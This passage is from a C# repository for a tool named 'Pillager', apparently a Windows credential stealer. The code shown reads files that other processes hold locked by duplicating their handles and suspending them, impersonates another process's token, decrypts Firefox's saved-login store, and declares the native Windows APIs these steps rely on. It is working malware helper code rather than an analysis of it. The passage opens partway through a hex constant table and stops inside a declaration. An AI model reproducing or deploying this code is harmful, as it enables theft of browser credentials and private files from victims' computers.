            0x0e12b4c2, 0x02e1329e, 0xaf664fd1, 0xcad18115,
            0x6b2395e0, 0x333e92e1, 0x3b240b62, 0xeebeb922,
            0x85b2a20e, 0xe6ba0d99, 0xde720c8c, 0x2da2f728,
            0xd0127845, 0x95b794fd, 0x647d0862, 0xe7ccf5f0,
            0x5449a36f, 0x877d48fa, 0xc39dfd27, 0xf33e8d1e,
            0x0a476341, 0x992eff74, 0x3a6f6eab, 0xf4f8fd37,
            0xa812dc60, 0xa1ebddf8, 0x991be14c, 0xdb6e6b0d,
            0xc67b5510, 0x6d672c37, 0x2765d43b, 0xdcd0e804,
            0xf1290dc7, 0xcc00ffa3, 0xb5390f92, 0x690fed0b,
            0x667b9ffb, 0xcedb7d9c, 0xa091cf0b, 0xd9155ea3,
            0xbb132f88, 0x515bad24, 0x7b9479bf, 0x763bd6eb,
            0x37392eb3, 0xcc115979, 0x8026e297, 0xf42e312d,
            0x6842ada7, 0xc66a2b3b, 0x12754ccc, 0x782ef11c,
            0x6a124237, 0xb79251e7, 0x06a1bbe6, 0x4bfb6350,
            0x1a6b1018, 0x11caedfa, 0x3d25bdd8, 0xe2e1c3c9,
            0x44421659, 0x0a121386, 0xd90cec6e, 0xd5abea2a,
            0x64af674e, 0xda86a85f, 0xbebfe988, 0x64e4c3fe,
            0x9dbc8057, 0xf0f7c086, 0x60787bf8, 0x6003604d,
            0xd1fd8346, 0xf6381fb0, 0x7745ae04, 0xd736fccc,
            0x83426b33, 0xf01eab71, 0xb0804187, 0x3c005e5f,
            0x77a057be, 0xbde8ae24, 0x55464299, 0xbf582e61,
            0x4e58f48f, 0xf2ddfda2, 0xf474ef38, 0x8789bdc2,
            0x5366f9c3, 0xc8b38e74, 0xb475f255, 0x46fcd9b9,
            0x7aeb2661, 0x8b1ddf84, 0x846a0e79, 0x915f95e2,
            0x466e598e, 0x20b45770, 0x8cd55591, 0xc902de4c,
            0xb90bace1, 0xbb8205d0, 0x11a86248, 0x7574a99e,
            0xb77f19b6, 0xe0a9dc09, 0x662d09a1, 0xc4324633,
            0xe85a1f02, 0x09f0be8c, 0x4a99a025, 0x1d6efe10,
            0x1ab93d1d, 0x0ba5a4df, 0xa186f20f, 0x2868f169,
            0xdcb7da83, 0x573906fe, 0xa1e2ce9b, 0x4fcd7f52,
            0x50115e01, 0xa70683fa, 0xa002b5c4, 0x0de6d027,
            0x9af88c27, 0x773f8641, 0xc3604c06, 0x61a806b5,
            0xf0177a28, 0xc0f586e0, 0x006058aa, 0x30dc7d62,
            0x11e69ed7, 0x2338ea63, 0x53c2dd94, 0xc2c21634,
            0xbbcbee56, 0x90bcb6de, 0xebfc7da1, 0xce591d76,
            0x6f05e409, 0x4b7c0188, 0x39720a3d, 0x7c927c24,
            0x86e3725f, 0x724d9db9, 0x1ac15bb4, 0xd39eb8fc,
            0xed545578, 0x08fca5b5, 0xd83d7cd3, 0x4dad0fc4,
            0x1e50ef5e, 0xb161e6f8, 0xa28514d9, 0x6c51133c,
            0x6fd5c7e7, 0x56e14ec4, 0x362abfce, 0xddc6c837,
            0xd79a3234, 0x92638212, 0x670efa8e, 0x406000e0,
            0x3a39ce37, 0xd3faf5cf, 0xabc27737, 0x5ac52d1b,
            0x5cb0679e, 0x4fa33742, 0xd3822740, 0x99bc9bbe,
            0xd5118e9d, 0xbf0f7315, 0xd62d1c7e, 0xc700c47b,
            0xb78c1b6b, 0x21a19045, 0xb26eb1be, 0x6a366eb4,
            0x5748ab2f, 0xbc946e79, 0xc6a376d2, 0x6549c2c8,
            0x530ff8ee, 0x468dde7d, 0xd5730a1d, 0x4cd04dc6,
            0x2939bbdb, 0xa9ba4650, 0xac9526e8, 0xbe5ee304,
            0xa1fad5f0, 0x6a2d519a, 0x63ef8ce2, 0x9a86ee22,
            0xc089c2b8, 0x43242ef6, 0xa51e03aa, 0x9cf2d0a4,
            0x83c061ba, 0x9be96a4d, 0x8fe51550, 0xba645bd6,
            0x2826a2f9, 0xa73a3ae1, 0x4ba99586, 0xef5562e9,
            0xc72fefd3, 0xf752f7da, 0x3f046f69, 0x77fa0a59,
            0x80e4a915, 0x87b08601, 0x9b09e6ad, 0x3b3ee593,
            0xe990fd5a, 0x9e34d797, 0x2cf0b7d9, 0x022b8b51,
            0x96d5ac3a, 0x017da67d, 0xd1cf3ed6, 0x7c7d2d28,
            0x1f9f25cf, 0xadf2b89b, 0x5ad6b472, 0x5a88f54c,
            0xe029ac71, 0xe019a5e6, 0x47b0acfd, 0xed93fa9b,
            0xe8d3c48d, 0x283b57cc, 0xf8d56629, 0x79132e28,
            0x785f0191, 0xed756055, 0xf7960e44, 0xe3d35e8c,
            0x15056dd4, 0x88f46dba, 0x03a16125, 0x0564f0bd,
            0xc3eb9e15, 0x3c9057a2, 0x97271aec, 0xa93a072a,
            0x1b3f6d9b, 0x1e6321f5, 0xf59c66fb, 0x26dcf319,
            0x7533d928, 0xb155fdf5, 0x03563482, 0x8aba3cbb,
            0x28517711, 0xc20ad9f8, 0xabcc5167, 0xccad925f,
            0x4de81751, 0x3830dc8e, 0x379d5862, 0x9320f991,
            0xea7a90c2, 0xfb3e7bce, 0x5121ce64, 0x774fbe32,
            0xa8b6e37e, 0xc3293d46, 0x48de5369, 0x6413e680,
            0xa2ae0810, 0xdd6db224, 0x69852dfd, 0x09072166,
            0xb39a460a, 0x6445c0dd, 0x586cdecf, 0x1c20c8ae,
            0x5bbef7dd, 0x1b588d40, 0xccd2017f, 0x6bb4e3bb,
            0xdda26a7e, 0x3a59ff45, 0x3e350a44, 0xbcb4cdd5,
            0x72eacea8, 0xfa6484bb, 0x8d6612ae, 0xbf3c6f47,
            0xd29be463, 0x542f5d9e, 0xaec2771b, 0xf64e6370,
            0x740e0d8d, 0xe75b1357, 0xf8721671, 0xaf537d5d,
            0x4040cb08, 0x4eb4e2cc, 0x34d2466a, 0x0115af84,
            0xe1b00428, 0x95983a1d, 0x06b89fb4, 0xce6ea048,
            0x6f3f3b82, 0x3520ab82, 0x011a1d4b, 0x277227f8,
            0x611560b1, 0xe7933fdc, 0xbb3a792b, 0x344525bd,
            0xa08839e1, 0x51ce794b, 0x2f32c9b7, 0xa01fbac9,
            0xe01cc87e, 0xbcc7d1f6, 0xcf0111c3, 0xa1e8aac7,
            0x1a908749, 0xd44fbd9a, 0xd0dadecb, 0xd50ada38,
            0x0339c32a, 0xc6913667, 0x8df9317c, 0xe0b12b4f,
            0xf79e59b7, 0x43f5bb3a, 0xf2d519ff, 0x27d9459c,
            0xbf97222c, 0x15e6fc2a, 0x0f91fc71, 0x9b941525,
            0xfae59361, 0xceb69ceb, 0xc2a86459, 0x12baa8d1,
            0xb6c1075e, 0xe3056a0c, 0x10d25065, 0xcb03a442,
            0xe0ec6e0e, 0x1698db3b, 0x4c98a0be, 0x3278e964,
            0x9f1f9532, 0xe0d392df, 0xd3a0342b, 0x8971f21e,
            0x1b0a7441, 0x4ba3348c, 0xc5be7120, 0xc37632d8,
            0xdf359f8d, 0x9b992f2e, 0xe60b6f47, 0x0fe3f11d,
            0xe54cda54, 0x1edad891, 0xce6279cf, 0xcd3e7e6f,
            0x1618b166, 0xfd2c1d05, 0x848fd2c5, 0xf6fb2299,
            0xf523f357, 0xa6327623, 0x93a83531, 0x56cccd02,
            0xacf08162, 0x5a75ebb5, 0x6e163697, 0x88d273cc,
            0xde966292, 0x81b949d0, 0x4c50901b, 0x71c65614,
            0xe6c6c7bd, 0x327a140a, 0x45e1d006, 0xc3f27b9a,
            0xc9aa53fd, 0x62a80f00, 0xbb25bfe2, 0x35bdd2f6,
            0x71126905, 0xb2040222, 0xb6cbcf7c, 0xcd769c2b,
            0x53113ec0, 0x1640e3d3, 0x38abbd60, 0x2547adf0,
            0xba38209c, 0xf746ce76, 0x77afa1c5, 0x20756060,
            0x85cbfe4e, 0x8ae88dd8, 0x7aaaf9b0, 0x4cf9aa7e,
            0x1948c25c, 0x02fb8a8c, 0x01c36ae4, 0xd6ebe1f9,
            0x90d4f869, 0xa65cdea0, 0x3f09252d, 0xc208e69f,
            0xb74e6132, 0xce77e25b, 0x578fdfe3, 0x3ac372e6
        };
    }
}

```

`Pillager/Helper/LockedFile.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace Pillager.Helper
{
    internal class LockedFile
    {
        public static byte[] ReadLockedFile(string fileName)
        {
            try
            {
                int pid = GetProcessIDByFileName(fileName)[0];
                IntPtr hfile = DuplicateHandleByFileName(pid, fileName);
                var oldFilePointer = Native.SetFilePointer(hfile, 0, 0, 1);
                int size = Native.SetFilePointer(hfile, 0, 0, 2);
                byte[] fileBuffer = new byte[size];
                IntPtr hProcess = Native.OpenProcess(Native.PROCESS_ACCESS_FLAGS.PROCESS_SUSPEND_RESUME, false, pid);
                Native.NtSuspendProcess(hProcess);
                Native.SetFilePointer(hfile, 0, 0, 0);
                Native.ReadFile(hfile, fileBuffer, (uint)size, out _, IntPtr.Zero);
                Native.SetFilePointer(hfile, oldFilePointer, 0, 0);
                Native.CloseHandle(hfile);
                Native.NtResumeProcess(hProcess);
                Native.CloseHandle(hProcess);
                return fileBuffer;
            }
            catch { return null; }
        }

        public static List<Native.SYSTEM_HANDLE_INFORMATION> GetHandles(int pid)
        {
            List<Native.SYSTEM_HANDLE_INFORMATION> aHandles = new List<Native.SYSTEM_HANDLE_INFORMATION>();
            int handle_info_size = Marshal.SizeOf(new Native.SYSTEM_HANDLE_INFORMATION()) * 20000;
            IntPtr ptrHandleData = IntPtr.Zero;
            try
            {
                ptrHandleData = Marshal.AllocHGlobal(handle_info_size);
                int nLength = 0;

                while (Native.NtQuerySystemInformation(Native.CNST_SYSTEM_HANDLE_INFORMATION, ptrHandleData, handle_info_size, ref nLength) == Native.STATUS_INFO_LENGTH_MISMATCH)
                {
                    handle_info_size = nLength;
                    Marshal.FreeHGlobal(ptrHandleData);
                    ptrHandleData = Marshal.AllocHGlobal(nLength);
                }
                if (IntPtr.Size == 8)
                {
                    int handle_count = Marshal.ReadIntPtr(ptrHandleData).ToInt32();
                    IntPtr ptrHandleItem = new IntPtr(ptrHandleData.ToInt64() + IntPtr.Size);

                    for (long lIndex = 0; lIndex < handle_count; lIndex++)
                    {
                        Native.SYSTEM_HANDLE_INFORMATION oSystemHandleInfo = new Native.SYSTEM_HANDLE_INFORMATION();
                        oSystemHandleInfo = (Native.SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(ptrHandleItem, oSystemHandleInfo.GetType());
                        ptrHandleItem = new IntPtr(ptrHandleItem.ToInt64() + Marshal.SizeOf(oSystemHandleInfo.GetType()));
                        if (oSystemHandleInfo.ProcessID != pid) { continue; }
                        aHandles.Add(oSystemHandleInfo);
                    }
                }
                else
                {
                    int handle_count = Marshal.ReadIntPtr(ptrHandleData).ToInt32();
                    IntPtr ptrHandleItem = new IntPtr(ptrHandleData.ToInt32() + IntPtr.Size);

                    for (long lIndex = 0; lIndex < handle_count; lIndex++)
                    {
                        Native.SYSTEM_HANDLE_INFORMATION oSystemHandleInfo = new Native.SYSTEM_HANDLE_INFORMATION();
                        oSystemHandleInfo = (Native.SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(ptrHandleItem, oSystemHandleInfo.GetType());
                        ptrHandleItem = new IntPtr(ptrHandleItem.ToInt32() + Marshal.SizeOf(new Native.SYSTEM_HANDLE_INFORMATION()));
                        if (oSystemHandleInfo.ProcessID != pid) { continue; }
                        aHandles.Add(oSystemHandleInfo);
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                Marshal.FreeHGlobal(ptrHandleData);
            }
            return aHandles;
        }

        private static string TryGetName(IntPtr Handle)
        {
            Native.IO_STATUS_BLOCK status = new Native.IO_STATUS_BLOCK();
            uint bufferSize = 1024;
            var bufferPtr = Marshal.AllocHGlobal((int)bufferSize);
            Native.NtQueryInformationFile(Handle, ref status, bufferPtr, bufferSize, Native.FILE_INFORMATION_CLASS.FileNameInformation);
            var nameInfo = (Native.FileNameInformation)Marshal.PtrToStructure(bufferPtr, typeof(Native.FileNameInformation));
            if (nameInfo.NameLength > bufferSize || nameInfo.NameLength <= 0)
            {
                return null;
            }
            return Marshal.PtrToStringUni(new IntPtr((IntPtr.Size == 8 ? bufferPtr.ToInt64() : bufferPtr.ToInt32()) + 4), nameInfo.NameLength / 2);
        }

        public static IntPtr FindHandleByFileName(Native.SYSTEM_HANDLE_INFORMATION systemHandleInformation, string filename, IntPtr processHandle)
        {
            IntPtr openProcessHandle = processHandle;
            try
            {
                if (!Native.DuplicateHandle(openProcessHandle, new IntPtr(systemHandleInformation.Handle), Native.GetCurrentProcess(), out var ipHandle, 0, false, Native.DUPLICATE_SAME_ACCESS))
                {
                    return IntPtr.Zero;
                }
                int objectTypeInfoSize = 0x1000;
                IntPtr objectTypeInfo = Marshal.AllocHGlobal(objectTypeInfoSize);
                try
                {
                    int returnLength = 0;
                    if (Native.NtQueryObject(ipHandle, (int)Native.OBJECT_INFORMATION_CLASS.ObjectTypeInformation, objectTypeInfo, objectTypeInfoSize, ref returnLength) != 0)
                    {
                        return IntPtr.Zero;
                    }
                    var objectTypeInfoStruct = (Native.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(objectTypeInfo, typeof(Native.OBJECT_TYPE_INFORMATION));
                    string typeName = objectTypeInfoStruct.Name.ToString();
                    if (typeName == "File")
                    {
                        string name = TryGetName(ipHandle);
                        if (name == filename.Substring(2, filename.Length - 2))
                            return ipHandle;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(objectTypeInfo);
                }
            }
            catch { }

            return IntPtr.Zero;
        }

        private static IntPtr DuplicateHandleByFileName(int pid, string fileName)
        {
            IntPtr handle = IntPtr.Zero;
            List<Native.SYSTEM_HANDLE_INFORMATION> syshInfos = GetHandles(pid);
            IntPtr processHandle = GetProcessHandle(pid);

            foreach (var t in syshInfos)
            {
                handle = FindHandleByFileName(t, fileName, processHandle);
                if (handle != IntPtr.Zero)
                {
                    Native.CloseHandle(processHandle);
                    return handle;
                }
            }
            Native.CloseHandle(processHandle);
            return handle;
        }

        private static List<int> GetProcessIDByFileName(string path)
        {
            List<int> result = new List<int>();
            var bufferPtr = IntPtr.Zero;
            var statusBlock = new Native.IO_STATUS_BLOCK();

            try
            {
                var handle = GetFileHandle(path);
                uint bufferSize = 0x4000;
                bufferPtr = Marshal.AllocHGlobal((int)bufferSize);

                uint status;
                while ((status = Native.NtQueryInformationFile(handle,
                    ref statusBlock, bufferPtr, bufferSize,
                    Native.FILE_INFORMATION_CLASS.FileProcessIdsUsingFileInformation))
                    == Native.STATUS_INFO_LENGTH_MISMATCH)
                {
                    Marshal.FreeHGlobal(bufferPtr);
                    bufferPtr = IntPtr.Zero;
                    bufferSize *= 2;
                    bufferPtr = Marshal.AllocHGlobal((int)bufferSize);
                }

                Native.CloseHandle(handle);

                if (status != Native.STATUS_SUCCESS)
                {
                    return result;
                }

                IntPtr readBuffer = bufferPtr;
                int numEntries = Marshal.ReadInt32(readBuffer); // NumberOfProcessIdsInList
                readBuffer = IntPtr.Size == 8 ? new IntPtr(readBuffer.ToInt64() + IntPtr.Size) : new IntPtr(readBuffer.ToInt32() + IntPtr.Size);
                for (int i = 0; i < numEntries; i++)
                {
                    IntPtr processId = Marshal.ReadIntPtr(readBuffer); // A single ProcessIdList[] element
                    result.Add(processId.ToInt32());
                    readBuffer = IntPtr.Size == 8 ? new IntPtr(readBuffer.ToInt64() + IntPtr.Size) : new IntPtr(readBuffer.ToInt32() + IntPtr.Size);
                }
            }
            catch { return result; }
            finally
            {
                if (bufferPtr != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(bufferPtr);
                }
            }
            return result;
        }

        private static IntPtr GetFileHandle(string name)
        {
            return Native.CreateFile(name,
                0,
                FileShare.Read | FileShare.Write | FileShare.Delete,
                IntPtr.Zero,
                FileMode.Open,
                (int)FileAttributes.Normal,
                IntPtr.Zero);
        }

        private static IntPtr GetProcessHandle(int pid)
        {
            return Native.OpenProcess(Native.PROCESS_ACCESS_FLAGS.PROCESS_DUP_HANDLE | Native.PROCESS_ACCESS_FLAGS.PROCESS_VM_READ, false, pid);
        }
    }
}

```

`Pillager/Helper/Methods.cs`:

```cs
using System;
using System.IO;
using System.Management;

namespace Pillager.Helper
{
    internal class Methods
    {
        public static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            var dir = new DirectoryInfo(sourceDir);

            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            DirectoryInfo[] dirs = dir.GetDirectories();
            Directory.CreateDirectory(destinationDir);
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                try
                {
                    File.WriteAllBytes(targetFilePath, File.ReadAllBytes(file.FullName));
                }
                catch
                {
                    byte[] filebytes = LockedFile.ReadLockedFile(file.FullName);
                    if (filebytes != null)
                    {
                        File.WriteAllBytes(targetFilePath, filebytes);
                    }
                }
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        public static string GetProcessUserName(int pID)
        {
            string text1 = null;
            SelectQuery query1 = new SelectQuery("Select * from Win32_Process WHERE processID=" + pID);
            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);
            try
            {
                foreach (ManagementObject disk in searcher1.Get())
                {
                    ManagementBaseObject inPar = null;
                    ManagementBaseObject outPar = null;
                    inPar = disk.GetMethodParameters("GetOwner");
                    outPar = disk.InvokeMethod("GetOwner", inPar, null);
                    text1 = outPar["User"].ToString();
                    break;
                }
            }
            catch
            {
                text1 = "SYSTEM";
            }
            return text1;
        }

        public static bool ImpersonateProcessToken(int pid)
        {
            IntPtr hProcess = Native.OpenProcess(Native.PROCESS_ACCESS_FLAGS.PROCESS_QUERY_INFORMATION, true, pid);
            if (hProcess == IntPtr.Zero) return false;
            IntPtr hToken;
            if (!Native.OpenProcessToken(hProcess, 0x00000002 | 0x00000004, out hToken)) return false;
            IntPtr DuplicatedToken = new IntPtr();
            if (!Native.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            if (!Native.SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;
            return true;
        }
    }
}

```

`Pillager/Helper/MozillaPBE.cs`:

```cs
using System;
using System.Security.Cryptography;

namespace Pillager.Helper
{
    public class MozillaPBE
    {
        private byte[] cipherText { get; set; }
        private byte[] GlobalSalt { get; set; }
        private byte[] MasterPassword { get; set; }
        private byte[] EntrySalt { get; set; }
        public byte[] partIV { get; private set; }

        public MozillaPBE(byte[] cipherText, byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt, byte[] partIV)
        {
            this.cipherText = cipherText;
            this.GlobalSalt = GlobalSalt;
            this.MasterPassword = MasterPassword;
            this.EntrySalt = EntrySalt;
            this.partIV = partIV;
        }

        public byte[] Compute()
        {
            int iterations = 1;
            int keyLength = 32;

            // GLMP
            var GLMP = new byte[GlobalSalt.Length + MasterPassword.Length]; // GlobalSalt + MasterPassword
            Buffer.BlockCopy(GlobalSalt, 0, GLMP, 0, GlobalSalt.Length);
            Buffer.BlockCopy(MasterPassword, 0, GLMP, GlobalSalt.Length, MasterPassword.Length);

            // HP
            var HP = new SHA1Managed().ComputeHash(GLMP); // SHA1(GLMP)

            // IV
            byte[] ivPrefix = { 0x04, 0x0e };
            var IV = new byte[ivPrefix.Length + partIV.Length]; // ivPrefix + partIV
            Buffer.BlockCopy(ivPrefix, 0, IV, 0, ivPrefix.Length);
            Buffer.BlockCopy(partIV, 0, IV, ivPrefix.Length, partIV.Length);

            // .NET 4.6 doesn't have support for PBKDF2 with SHA256, it was introduced in .NET 4.7.2
            // I wanna stick with .NET 4.6 so I'll use this PBKDF2_SHA256 implementation by medo64(https://github.com/medo64)
            // (https://github.com/medo64/Medo/blob/master/Source/Medo/Security/Cryptography/Pbkdf2%20%5B001%5D.cs)
            var df = new Pbkdf2(new HMACSHA256(), HP, EntrySalt, iterations);
            var key = df.GetBytes(keyLength); // ivPrefix + partIV

            // AES-CBC-256 settings
            Aes aes = new AesManaged
            {
                Mode = CipherMode.CBC,
                BlockSize = 128,
                KeySize = 256,
                Padding = PaddingMode.Zeros,
            };

            // Decrypt AES cipher text
            ICryptoTransform AESDecrypt = aes.CreateDecryptor(key, IV);
            var clearText = AESDecrypt.TransformFinalBlock(cipherText, 0, cipherText.Length);

            return clearText;
        }
    }
}

```

`Pillager/Helper/Native.cs`:

```cs
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Pillager.Helper
{
    public static class Native
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool RevertToSelf();
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll")]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
        [DllImport("kernel32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
        [DllImport("shell32.dll")]
        public static extern int SHGetFolderPath(IntPtr hwndOwner, int nFolder, IntPtr hToken, uint dwFlags, [Out] StringBuilder pszPath);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessDPIAware();
        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtSuspendProcess([In] IntPtr Handle);
        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern uint NtResumeProcess(IntPtr ProcessHandle);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
        [DllImport("kernel32.dll", EntryPoint = "SetFilePointer")]
        public static extern int SetFilePointer(IntPtr hFile, int lDistanceToMove, int lpDistanceToMoveHigh, int dwMoveMethod);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct SYSTEM_HANDLE_INFORMATION
        { // Information Class 16
            public ushort ProcessID;
            public ushort CreatorBackTrackIndex;
            public byte ObjectType;
            public byte HandleAttribute;
            public ushort Handle;
            public IntPtr Object_Pointer;
            public IntPtr AccessMask;
        }

        public enum OBJECT_INFORMATION_CLASS
        {
            ObjectBasicInformation = 0,
            ObjectNameInformation = 1,
            ObjectTypeInformation = 2,
            ObjectAllTypesInformation = 3,
            ObjectHandleInformation = 4
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FileNameInformation
        {
            public int NameLength;
            public char Name;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;

            public override string ToString()
            {
                return Buffer != IntPtr.Zero ? Marshal.PtrToStringUni(Buffer, Length / 2) : null;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct GENERIC_MAPPING
        {
            public int GenericRead;
            public int GenericWrite;
            public int GenericExecute;
            public int GenericAll;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_TYPE_INFORMATION
        {
            public UNICODE_STRING Name;
            int TotalNumberOfObjects;
            int TotalNumberOfHandles;
            int TotalPagedPoolUsage;
            int TotalNonPagedPoolUsage;
            int TotalNamePoolUsage;
            int TotalHandleTableUsage;
            int HighWaterNumberOfObjects;
            int HighWaterNumberOfHandles;
            int HighWaterPagedPoolUsage;
            int HighWaterNonPagedPoolUsage;
            int HighWaterNamePoolUsage;
            int HighWaterHandleTableUsage;
            int InvalidAttributes;
            GENERIC_MAPPING GenericMapping;
            int ValidAccess;
            bool SecurityRequired;
            bool MaintainHandleCount;
            ushort MaintainTypeList;
            POOL_TYPE PoolType;
            int PagedPoolUsage;
            int NonPagedPoolUsage;
        }

        public enum POOL_TYPE
        {
            NonPagedPool,
            PagedPool,
            NonPagedPoolMustSucceed,
            DontUseThisType,
            NonPagedPoolCacheAligned,
            PagedPoolCacheAligned,
            NonPagedPoolCacheAlignedMustS
        }

        public const int CNST_SYSTEM_HANDLE_INFORMATION = 0x10;
        public const int DUPLICATE_SAME_ACCESS = 0x2;

        [DllImport("ntdll.dll")]
        public static extern int NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ntdll.dll")]
        public static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, BestFitMapping = false)]
        public static extern IntPtr CreateFile(
            string lpFileName,
            int dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            int dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        [DllImport("ntdll.dll")]
        public static extern uint NtQueryInformationFile(IntPtr fileHandle, ref IO_STATUS_BLOCK IoStatusBlock,
            IntPtr pInfoBlock, uint length, FILE_INFORMATION_CLASS fileInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        public const uint STATUS_SUCCESS = 0;
        public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct IO_STATUS_BLOCK
        {
            public uint Status;
            public IntPtr Information;
        }

        [Flags]
        public enum PROCESS_ACCESS_FLAGS : uint
        {
            PROCESS_ALL_ACCESS = 0x001F0FFF,
            PROCESS_CREATE_PROCESS = 0x0080,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_DUP_HANDLE = 0x0040,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
            PROCESS_SET_INFORMATION = 0x0200,
            PROCESS_SET_QUOTA = 0x0100,
            PROCESS_SUSPEND_RESUME = 0x0800,
            PROCESS_TERMINATE = 0x0001,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020,
            SYNCHRONIZE = 0x00100000
        }

        public enum FILE_INFORMATION_CLASS
        {
            FileDirectoryInformation = 1,
            FileFullDirectoryInformation = 2,
            FileBothDirectoryInformation = 3,
            FileBasicInformation = 4,
            FileStandardInformation = 5,
            FileInternalInformation = 6,
            FileEaInformation = 7,
            FileAccessInformation = 8,
            FileNameInformation = 9,
            FileRenameInformation = 10,
            FileLinkInformation = 11,
            FileNamesInformation = 12,
            FileDispositionInformation = 13,
            FilePositionInformation = 14,
            FileFullEaInformation = 15,
            FileModeInformation = 16,
            FileAlignmentInformation = 17,
            FileAllInformation = 18,
            FileAllocationInformation = 19,
            FileEndOfFileInformation = 20,
            FileAlternateNameInformation = 21,
            FileStreamInformation = 22,
            FilePipeInformation = 23,
            FilePipeLocalInformation = 24,
            FilePipeRemoteInformation = 25,
            FileMailslotQueryInformation = 26,
            FileMailslotSetInformation = 27,
            FileCompressionInformation = 28,
            FileObjectIdInformation = 29,
            FileCompletionInformation = 30,
            FileMoveClusterInformation = 31,
            FileQuotaInformation = 32,
            FileReparsePointInformation = 33,
            FileNetworkOpenInformation = 34,
            FileAttributeTagInformation = 35,
            FileTrackingInformation = 36,
            FileIdBothDirectoryInformation = 37,
            FileIdFullDirectoryInformation = 38,
            FileValidDataLengthInformation = 39,
            FileShortNameInformation = 40,
            FileIoCompletionNotificationInformation = 41,
            FileIoStatusBlockRangeInformation = 42,
            FileIoPriorityHintInformation = 43,
            FileSfioReserveInformation = 44,
            FileSfioVolumeInformation = 45,
            FileHardLinkInformation = 46,
            FileProcessIdsUsingFileInformation = 47,
            FileNormalizedNameInformation = 48,
            FileNetworkPhysicalNameInformation = 49,
            FileMaximumInformation = 50
        }


        #region WLAN
        [DllImport("Wlanapi.dll")]
        public static extern int WlanOpenHandle(int dwClientVersion, IntPtr pReserved, [Out] out IntPtr pdwNegotiatedVersion, ref IntPtr ClientHandle);

        [DllImport("Wlanapi", EntryPoint = "WlanCloseHandle")]
        public static extern uint WlanCloseHandle([In] IntPtr hClientHandle, IntPtr pReserved);


        [DllImport("Wlanapi", EntryPoint = "WlanEnumInterfaces")]
        public static extern uint WlanEnumInterfaces([In] IntPtr hClientHandle, IntPtr pReserved, ref IntPtr ppInterfaceList);


        [DllImport("wlanapi.dll", SetLastError = true)]
